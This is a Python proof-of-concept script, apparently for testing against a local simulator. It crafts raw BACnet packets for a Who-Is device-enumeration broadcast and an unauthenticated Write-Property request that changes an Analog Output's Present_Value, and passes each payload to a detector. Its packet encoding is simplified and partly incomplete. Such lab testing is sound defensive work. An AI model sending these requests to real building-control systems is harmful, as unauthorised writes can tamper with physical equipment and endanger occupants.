import socket
import struct
from bacnet_detector import detect_bacnet

TARGET = ('127.0.0.1', 0xBAC0)

def build_who_is():
    """构造 Who-Is 广播请求"""
    npdu = bytes([0x01, 0x20])                  # version=1, control=0x20 (no reply, broadcast)
    apdu = bytes([0x10, 0x08])                  # Unconfirmed-Request, service=Who-Is
    bvlc = struct.pack('>BBH', 0x81, 0x0B, 4+len(npdu)+len(apdu))  # 0x0B = Original-Broadcast-NPDU
    return bvlc + npdu + apdu

def build_write_property(device_id, obj_type, obj_inst, prop_id, value_float):
    """构造未授权写属性请求 (Write-Property)"""
    # APDU: Confirmed-Request, invokeID=1, service=Write-Property(0x0F)
    # 后面跟对象类型、实例、属性ID、值（简化，直接拼装）
    apdu = bytes([
        0x00, 0x01, 0x0F,             # Confirmed-Request(0x00), invoke=1, service=0x0F
        obj_type, obj_inst >> 8, obj_inst & 0xFF,  # 对象类型, 实例(2字节大端)
        prop_id,                       # 属性ID
        0x44,                          # 值类型 REAL (4字节浮点)
    ]) + struct.pack('>f', value_float)   # 浮点值

    npdu = bytes([0x01, 0x24])        # version=1, control=0x24 (expecting reply)
    bvlc = struct.pack('>BBH', 0x81, 0x0A, 4+len(npdu)+len(apdu))  # 0x0A = Original-Unicast-NPDU
    return bvlc + npdu + apdu

def poc_who_is_amplification():
    print("\n[PoC] 发送 Who-Is 广播（设备枚举）...")
    payload = build_who_is()
    print("[PoC] 发送报文:")
    detect_bacnet(payload)

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(2)
    try:
        sock.sendto(payload, TARGET)
        data, _ = sock.recvfrom(1024)
        print(f"[模拟器] 响应: {data.hex()}")
    except socket.timeout:
        print("[模拟器] 超时无响应")
    finally:
        sock.close()

def poc_unauthorized_write():
    print("\n[PoC] 尝试未授权写属性 (Present_Value=2.0)...")
    # 写设备1234，对象Analog Output(类型1)实例1，属性Present_Value(85)，值2.0
    payload = build_write_property(1234, 0x01, 1, 85, 2.0)
    print("[PoC] 发送报文:")
    detect_bacnet(payload)

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(2)
    try:
        sock.sendto(payload, TARGET)
        data, _ = sock.recvfrom(1024)
        print(f"[模拟器] 响应: {data.hex()}")
    except socket.timeout:
        print("[模拟器] 超时无响应")
    finally:
        sock.close()

if __name__ == '__main__':
    print("BACnet PoC 测试开始，目标：{}:{}".format(*TARGET))
    poc_who_is_amplification()
    poc_unauthorized_write()